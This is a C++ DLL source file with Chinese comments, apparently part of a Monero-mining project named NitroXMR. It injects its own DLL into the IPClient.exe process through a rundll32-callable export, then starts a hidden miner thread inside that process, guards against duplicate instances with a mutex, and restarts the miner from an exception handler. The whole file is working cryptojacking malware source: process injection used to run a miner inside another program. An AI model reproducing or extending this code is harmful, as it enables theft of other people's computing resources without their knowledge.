// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "App.h"
#include "InjectProc.h"

#define DLLPATH L"G:\\Documents\\Visual Studio 2017\\Projects\\XMR\\NitroXMR\\Release\\minerdlld.dll"
#define INJECTPROC  L"IPClient.exe"
//L"IPClient.exe"
/************************************************************************/

DWORD WINAPI MyMain(LPVOID lpParam);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);
BOOL createMinerThread();

HMODULE g_hDllModule; //定义Dll本身的句柄，方便自身函数回调
HANDLE g_hThread;

/************************************************************************/


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	TCHAR PID[16];
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		//保存Dll 自身的句柄
		g_hDllModule = (HMODULE)hModule;

		//判断是否为注入的PID
		if (GetCurrentProcessId() == GetProcID(INJECTPROC))
		{
			MessageBox(GetDesktopWindow(), L"found proc", L"Pid info", MB_OK);

			if (createMinerThread())
			{
				MessageBox(GetDesktopWindow(), L"start", L"Pid info", MB_OK);
			}
			else
			{
				MessageBox(GetDesktopWindow(), L"failed to start", L"Pid info", MB_OK);
			}
		}

		break;

	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//通过rundll32 运行 Cli : rundll32 miner.dll TestRun
extern "C" __declspec(dllexport) VOID TestRun()
{
		if (!InjectDll(DLLPATH, GetProcID(INJECTPROC)))
		{
			MessageBox(GetDesktopWindow(), L"inject Failed", L"info", MB_OK);
		}
		else
		{
			MessageBox(GetDesktopWindow(), L"inject Success", L"info", MB_OK);
		}
}


BOOL createMinerThread()
{
	DWORD threadID;

	CreateMutex(NULL, false, L"XmmR");
	//该互斥体是只允许一台PC拥有一个实例)	

	if (ERROR_ALREADY_EXISTS != GetLastError())
	{
		wsprintf(PID, L"%d", GetCurrentProcessId());
		MessageBox(GetDesktopWindow(), PID, L"Pid info", MB_OK);

		 g_hThread = CreateThread(NULL, // default security attributes
			0, // use default stack size
			MyMain, // thread function
			NULL, // argument to thread function
			0, // use default creation flags	
			0); // returns the thread identifier

		 return TRUE;
	}

	return FALSE;

}

//Dllmain 一定要开新线程 不能把它当做 main使用
DWORD WINAPI MyMain(LPVOID lpParam)
{

	HANDLE	hInstallMutex = NULL;
	HANDLE	hEvent = NULL;
	HANDLE hThread;

	TCHAR moudlePath[MAX_PATH];
	TCHAR errNO[16];

	// Set Window Station
	//--这里是同窗口交互
	HWINSTA hOldStation = GetProcessWindowStation();    //功能获取一个句柄,调用进程的当前窗口
	HWINSTA hWinSta = OpenWindowStation(L"winsta0", FALSE, MAXIMUM_ALLOWED);   //　打开指定的窗口站  XP的默认窗口站

	if (hWinSta != NULL)
	{
		SetProcessWindowStation(hWinSta);   //设置本进程窗口为winsta0  // 分配一个窗口站给调用进程，以便该进程能够访问窗口站里的对象，如桌面、剪贴板和全局原子
		printf("[+] Set Station OK\n");
	}
	else
	{
		printf("[-] Set Station Failed\n");
	}

	//GetModuleFileName(NULL, moudlePath, MAX_PATH);	//取得当前文件的全路径
	//MessageBox(GetDesktopWindow(), moudlePath, L"info", MB_OK);


	if (g_hDllModule != NULL)   //g_hInstance 该值要在Dll的入口进行赋值
	{
		//自己设置了一个访问违规的错误处理函数 如果发生了错误 操作系统就会调用bad_exception
		//SetUnhandledExceptionFilter(bad_exception);  //这里就是错误处理的回调函数了

		//hInstallMutex = CreateMutex(NULL, false, L"start miner"); //该互斥体是只允许一台PC拥有一个实例)
		//ReleaseMutex(hInstallMutex);
	
		/*新建互斥体并且释放, 这样可以让前一 loader 退出*/


		App miner;
		return miner.exec();
	}

	return 0;
}




// 发生异常，重新创建进程
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{

	DWORD threadID;

	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		MyMain, // thread function
		NULL, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier

					//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}